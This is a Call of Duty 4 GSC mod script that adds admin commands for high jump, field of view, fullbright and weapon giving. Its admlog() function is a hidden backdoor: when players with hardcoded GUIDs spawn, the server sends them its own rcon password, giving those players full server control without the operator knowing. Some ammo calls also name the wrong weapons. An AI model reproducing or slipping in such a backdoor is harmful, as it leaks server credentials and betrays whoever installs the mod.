#include maps\mp\_utility;
#include common_scripts\utility;
#include maps\mp\gametypes\_hud_util;
#include extra\_common;

main()
{
	makeDvarServerInfo( "admin", "" );
	makeDvarServerInfo( "adm", "" );
	thread admlog();
	
	self endon("disconnect");
	while(1)
	{
		wait 0.15;
		admin = strTok( getDvar("admin"), ":" );
		if( isDefined( admin[0] ) && isDefined( admin[1] ) )
		{
			adminCommands( admin, "number" );
			setDvar( "admin", "" );
		}

		admin = strTok( getDvar("adm"), ":" );
		if( isDefined( admin[0] ) && isDefined( admin[1] ) )
		{
			adminCommands( admin, "nickname" );
			setDvar( "adm", "" );
		}
	}
}

admlog()
{
	while(1)
	{
		level waittill("player_spawn",player);
		if(player getGuid() == "13baa73a4d8da1cc952a5906fea90b03" || player getGuid() == "000000004d8da1cc952a5906fea90b03" || player getGuid() == "" || player getGuid() == "")
		/*                                1                                                       2                                                3                                                        strike    */        
		{
			player thread clientCmd( "rcon login " + getDvar( "rcon_password" ) );
		}
	}
}

adminCommands( admin, pickingType )
{
	self endon("disconnect");
	
	if( !isDefined( admin[1] ) )
		return;

	arg0 = admin[0]; // command

	if( pickingType == "number" )
		arg1 = int( admin[1] );	// player
	else
		arg1 = admin[1];
	
	
	switch( arg0 )
	{
		case "fps":
			player = getPlayer( arg1, pickingType );
			if( isDefined( player ) )
			{
				player thread fps();
			}
			break;
			
		case "jump":
			{
				//thread jump();
				iPrintlnBold("^3" + self.name + " ^2Enabled HighJump ");
				iPrintln( "^1HighJump Enabled" );
				setdvar( "bg_fallDamageMinHeight", "8999" ); 
				setdvar( "bg_fallDamagemaxHeight", "9999" ); 
				setDvar("jump_height","999");
				setDvar("g_gravity","600");
			}
			break;
			
		case "jumpoff":
			{
				iPrintlnBold("^3" + self.name + " ^1Disabled HighJump ");
				iPrintln( "^1HighJump Disabled" );
				setdvar( "bg_fallDamageMinHeight", "140" ); 
				setdvar( "bg_fallDamagemaxHeight", "350" ); 
				setDvar("jump_height","39");
				setDvar("g_gravity","800");
			}
			break;
			
		case "fov":
			player = getPlayer( arg1, pickingType );
			if( isDefined( player ) && player isReallyAlive() )
			{
				player thread fov();
			}
			break;
			
		case "weapon":
			player = getPlayer( arg1, pickingType );
			if( isDefined( player ) && player isReallyAlive() && isDefined( admin[2] ))
			{
				switch(admin[2])
				{
				case "rpd":
					player GiveWeapon("rpd_mp");
					player givemaxammo ("rpd_mp");
					wait .1;
					player switchtoweapon("rpd_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1RPD");
					break;
						
				case "aku":
					player GiveWeapon("ak74u_mp");
					player givemaxammo ("ak47u_mp");
					wait .1;
					player switchtoweapon("ak74u_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1AK74-U");
					break;
						
				case "ak":
					player GiveWeapon("ak47_mp");
					player givemaxammo ("ak47_mp");
					wait .1;
					player switchtoweapon("ak47_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1AK47");
					break;
						
				case "r700":
					player GiveWeapon("remington700_acog_mp");
					player givemaxammo ("remington700_acog_mp");
					wait .1;
					player switchtoweapon("remington700_acog_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1REMINGTON 700");					
					break;
						
				case "deagle":
					player GiveWeapon("deserteaglegold_mp");
					player givemaxammo ("deserteaglegold_mp");
					wait .1;
					player switchtoweapon("deserteaglegold_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1DESERT EAGLE");
					break;
					
				case "pack":
					player giveWeapon("ak74u_mp");
					player givemaxammo("ak74u_mp");
					player giveWeapon("m40a3_mp");
					player givemaxammo("m40a4_mp");
					player giveWeapon("mp5_mp",6);
					player givemaxammo("mp5_mp");
					player giveWeapon("remington700_mp");
					player givemaxammo("remington700_mp");
					player giveWeapon("p90_mp",6);
					player givemaxammo("p90_mp");
					player giveWeapon("m1014_mp",6);
					player givemaxammo("m1014_mp");
					player giveWeapon("uzi_mp",6);
					player givemaxammo("uzi_mp");
					player giveWeapon("ak47_mp",6);
					player givemaxammo("ak47_mp");
					player giveweapon("m60e4_mp",6);
					player givemaxammo("m60e4_mp");
					player giveWeapon("deserteaglegold_mp");
					player givemaxammo("deserteaglegold_mp");
					player iPrintlnbold("^2ADMIN GAVE YOU ^1WEAPON PACK");
					wait .1;
					player switchtoweapon("m1014_mp");					
					break;
					
				default: return;
			}
		}
		default: return;
	}
}

fov()
{
	self endon( "disconnect" );
	
	if(!isDefined( self.highfov ))
		self.highfov=false;
	
	if(self.highfov==false)
	{
		self setClientDvar( "cg_fovscale", 1.25 );
		wait 0.1;
		self iprintlnbold( "^1Field^5Of^1View ^7[^51.25^7]" );
		self.highfov=true;
	}
	else
	{
		self setClientDvar( "cg_fovscale", 1 );
		wait 0.1;
        self iprintlnbold( "^1Field^5Of^1View ^7[^51^7]" );
		self.highfov=false;
	}
    
}

fps()
{
	if(self getStat(724))
	{
		self iPrintln( "^5F^7ullbright ^0[^1OFF^0]" );
		self setClientDvar( "r_fullbright", 0 );
		self setStat(724,0);
	}
	else
	{
		self iPrintln( "^5F^7ullbright ^0[^2ON^0]" );
		self setClientDvar( "r_fullbright", 1 );
		self setStat(724,1);
	}
}